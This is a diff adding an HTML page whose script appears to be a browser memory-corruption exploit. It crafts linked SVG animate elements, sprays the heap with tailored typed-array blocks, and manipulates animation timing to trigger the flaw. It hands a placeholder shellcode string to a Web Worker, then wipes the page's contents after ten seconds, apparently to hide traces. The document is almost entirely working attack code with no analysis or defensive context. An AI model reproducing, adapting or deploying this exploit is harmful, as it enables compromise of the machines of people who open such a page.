@@ -1,0 +1,114 @@
+<html>
+<head>
+<script>
+var shellcode = '\u4141\u4141';
+var worker = new Worker('worker.js');
+worker.postMessage(shellcode);
+
+var svgns = 'http://www.w3.org/2000/svg';
+var heap80 = new Array(0x1000);
+var heap100 = new Array(0x4000);
+var block100 = new ArrayBuffer(0x100);
+var block80 = new Uint32Array(0x20); 
+
+var sprayBase =  undefined;
+var arrBase = undefined;
+
+var animateX = undefined;
+var containerA = undefined;
+
+var idGenerator = function(){
+      return 'id' + (((1+Math.random())*0x10000)|0).toString(16).substring(1);
+}
+
+var exploit = function()
+{
+	var u32 = new Uint32Array(block80);
+	for(i=0; i< block80.length; i++)
+	{
+	  if(i==0 || i==1){
+	  	block80[i] = 0xdeadbeef;
+	  }
+	  else if(i%2 == 0){
+		block80[i] = 0xb0000010 - 0x110;
+	  }
+	  else if(i%2 == 1){
+		block80[i] = 0x7fff;
+	  }
+	}
+        for(i = 0; i < heap80.length/2; i++)
+        {
+          heap80[i] = block80.slice(0)
+        }
+        animateX.setAttribute('begin', '59s')
+        animateX.setAttribute('begin', '58s')
+        for(i = heap80.length/2; i < heap80.length; i++)
+        {
+          heap80[i] = block80.slice(0)
+        }
+        animateX.setAttribute('begin', '10s')
+        animateX.setAttribute('begin', '9s')
+        containerA.pauseAnimations();
+}
+
+
+worker.onmessage = function(e){
+    worker.onmessage = function(e)
+    {
+        window.setTimeout(function(){
+            worker.terminate();
+            document.body.innerHTML = '';
+            document.getElementsByTagName('head')[0].innerHTML = '';
+            document.body.setAttribute('onload', '')
+          }, 10000);
+    }
+    arrBase = e.data;
+    exploit();
+}
+
+var craftDOM = function(){
+      containerA = document.createElementNS(svgns, 'svg')
+      var containerB = document.createElementNS(svgns, 'svg');
+      animateX = document.createElementNS(svgns, 'animate')
+      var animateA = document.createElementNS(svgns, 'animate')
+      var animateB = document.createElementNS(svgns, 'animate')
+      var animateC = document.createElementNS(svgns, 'animate')
+      var idX = idGenerator();
+      var idA = idGenerator();
+      var idB = idGenerator();
+      var idC = idGenerator();
+      animateX.setAttribute('id', idX);
+      animateA.setAttribute('id', idA);
+      animateA.setAttribute('end', '50s');
+      animateB.setAttribute('id', idB);
+      animateB.setAttribute('begin', '60s');
+      animateB.setAttribute('end', idC + '.end');
+      animateC.setAttribute('id', idC);
+      animateC.setAttribute('begin', '10s');
+      animateC.setAttribute('end', idA + '.end');
+      containerA.appendChild(animateX)
+      containerA.appendChild(animateA)
+      containerA.appendChild(animateB)
+      containerB.appendChild(animateC)
+      document.body.appendChild(containerA);
+      document.body.appendChild(containerB);
+}
+window.onload = craftDOM;
+</script>
+
+<style>
+	#mtdiv{
+            position: absolute;
+            width: 960px;
+            height: 166px;
+            z-index: 15;
+            top: 100px;
+            left: 50%;
+            margin: 0 0 0 -480px;
+        }
+</style>
+</head>
+<body bgcolor='#2F3236'>
+</body>
+
+</html>
